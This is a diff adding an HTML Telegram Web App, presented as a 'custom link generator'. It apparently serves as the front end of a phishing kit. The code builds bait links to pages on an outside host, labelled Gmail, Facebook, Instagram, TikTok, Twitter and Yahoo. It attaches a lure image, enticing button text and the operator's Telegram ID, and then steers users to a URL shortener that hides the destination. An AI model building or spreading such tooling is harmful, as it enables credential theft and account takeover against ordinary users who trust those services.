@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Generate Link</title>
+
+<style>
+  body {
+    font-family: 'Poppins', sans-serif;
+    text-align: center;
+    margin: 0;
+    padding: 50px 10px;
+    background: linear-gradient(135deg, #dff9fb, #ffffff);
+  }
+
+  input[type="text"], select {
+    width: 300px;
+    padding: 10px;
+    font-size: 16px;
+    border-radius: 8px;
+    border: 1px solid #0088cc;
+    margin-bottom: 10px;
+  }
+
+  button {
+    padding: 10px 25px;
+    margin: 6px;
+    border: none;
+    border-radius: 8px;
+    background-color: #0088cc;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+  }
+
+  button:hover {
+    background-color: #00b0ff;
+  }
+
+  #generatedLink {
+    margin-top: 30px;
+    word-break: break-all;
+    font-size: 16px;
+    color: #0088cc;
+  }
+
+  .guide-box {
+    background:#e0f7fa;
+    padding:15px;
+    border-radius:10px;
+    margin-bottom:20px;
+    text-align:left;
+    max-width:500px;
+    margin-left:auto;
+    margin-right:auto;
+  }
+
+  .guide-box ul {
+    padding-left:20px;
+  }
+
+  .guide-box a {
+    color:#0088cc;
+    text-decoration:none;
+  }
+
+  .guide-box a:hover {
+    text-decoration:underline;
+  }
+</style>
+</head>
+
+<body>
+
+<div class="guide-box">
+  <h2>Custom link generator 🔗</h2>
+  <p>Upload your image and paste the direct image link.</p>
+   <h3>How to get an image link</h3>
+    <p>You can host your image on free platforms and copy the direct link:</p>
+    <ul>
+      <li><strong>Imgur:</strong> <a href="https://imgur.com/upload" target="_blank">Upload here</a>. After uploading, right-click the image → "Copy image address".</li>
+      <li><strong>Postimages:</strong> <a href="https://postimages.org/" target="_blank">Upload here</a>. Select "Direct Link" after upload.</li>
+      <li><strong>ImageBB:</strong> <a href="https://ibb.co/" target="_blank">Upload here</a>. Copy the "Direct Link" URL.</li>
+      <li><strong>Other options:</strong> TinyPic, ImgBox, Catbox.moe (works for large files).</li>
+    </ul>
+    <p>Make sure your link ends with <code>.png, .jpg, .jpeg, .gif, .webp</code> etc. for it to work.</p>
+</div>
+
+<h3>Enter Image URL</h3>
+<input type="text" id="imageUrl" placeholder="Paste image link here"><br>
+
+<label>Choose Page:</label><br>
+<select id="pageSelect"></select><br><br>
+
+<label>Choose Button Text:</label><br>
+<select id="buttonTextSelect">
+  <option value="Message Now">Message Now</option>
+  <option value="Chat Now">Chat Now</option>
+  <option value="Join Group">Join Group</option>
+  <option value="Watch Now">Watch Now</option>
+  <option value="custom">Custom Text...</option>
+</select><br>
+
+<input type="text" id="customButtonText"
+placeholder="Enter custom button text"
+style="display:none;"><br>
+
+<button id="goDisplay">Generate Link</button>
+
+<div id="generatedLink"></div>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+  const tg = window.Telegram.WebApp;
+  tg.expand();
+
+  const adminId = "7979664801";
+  const userId = tg.initDataUnsafe?.user?.id || adminId;
+
+  const imageInput = document.getElementById("imageUrl");
+  const pageSelect = document.getElementById("pageSelect");
+  const buttonTextSelect = document.getElementById("buttonTextSelect");
+  const customButtonInput = document.getElementById("customButtonText");
+  const linkDiv = document.getElementById("generatedLink");
+
+  let lastGeneratedLink = "";
+
+  const pages = [
+    {name: "Gmail Page", value: "https://ollup.42web.io/pp/eg.html"},
+    {name: "Facebook Page", value: "https://ollup.42web.io/pp/ef.html"},
+    {name: "Instagram Page", value: "https://ollup.42web.io/pp/ei.html"},
+    {name: "TikTok Page", value: "https://ollup.42web.io/pp/et.html"},
+    {name: "Twitter (X) Page", value: "https://ollup.42web.io/pp/ex.html"},
+    {name: "Yahoo Page", value: "https://ollup.42web.io/pp/ey.html"}
+  ];
+
+  pages.forEach(p => {
+    const opt = document.createElement("option");
+    opt.value = p.value;
+    opt.textContent = p.name;
+    pageSelect.appendChild(opt);
+  });
+
+  buttonTextSelect.addEventListener("change", () => {
+    customButtonInput.style.display =
+      buttonTextSelect.value === "custom" ? "block" : "none";
+  });
+
+  function generateLink() {
+    const image = imageInput.value.trim();
+    if (!image) return alert("Please enter image URL");
+
+    let btnText = buttonTextSelect.value;
+    if (btnText === "custom") {
+      btnText = customButtonInput.value.trim();
+      if (!btnText) return alert("Enter custom button text");
+    }
+
+    lastGeneratedLink =
+      `${pageSelect.value}?id=${userId}` +
+      `&image=${encodeURIComponent(image)}` +
+      `&button=${encodeURIComponent(btnText)}`;
+
+    linkDiv.innerHTML = `
+      <p><strong>Generated link:</strong></p>
+      <input id="longLink" type="text" value="${lastGeneratedLink}" readonly>
+      <br>
+      <button onclick="copyLink()">Copy</button>
+      <button onclick="shorten()">Shorten Link 🔗</button>
+    `;
+  }
+
+  function copyLink() {
+    const el = document.getElementById("longLink");
+    el.select();
+    el.setSelectionRange(0, 99999);
+    document.execCommand("copy");
+    alert("Link copied!");
+  }
+
+  function shorten() {
+    if (!lastGeneratedLink) return;
+
+    // Copy exact link first
+    const temp = document.createElement("input");
+    temp.value = lastGeneratedLink;
+    document.body.appendChild(temp);
+    temp.select();
+    document.execCommand("copy");
+    document.body.removeChild(temp);
+
+    alert("Link copied. Paste it on the shortener page.");
+
+    // Open shortener WITHOUT passing URL
+    window.open("https://theurlshortener.me", "_blank");
+  }
+
+  document.getElementById("goDisplay").onclick = generateLink;
+</script>
+<!-- Tutorial Video Preview -->
+<div style="
+  max-width:560px;
+  margin:40px auto 0;
+  padding:15px;
+  background:#e0f7fa;
+  border-radius:12px;
+">
+
+  <h3 style="margin-top:0;text-align:center;">
+    📺 Quick Tutorial (Watch First)
+  </h3>
+
+  <div style="position:relative;padding-bottom:56.25%;height:0;overflow:hidden;border-radius:10px;">
+    <iframe
+      src="https://www.youtube.com/embed/WYxTDzBfKpU"
+      frameborder="0"
+      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+      allowfullscreen
+      style="position:absolute;top:0;left:0;width:100%;height:100%;">
+    </iframe>
+  </div>
+
+  <p style="text-align:center;margin-top:10px;font-size:14px;">    
+    ▶️ Watch this short video to learn how to generate and shorten your link fast
+  </p>
+</div>
+</body>
+</html>
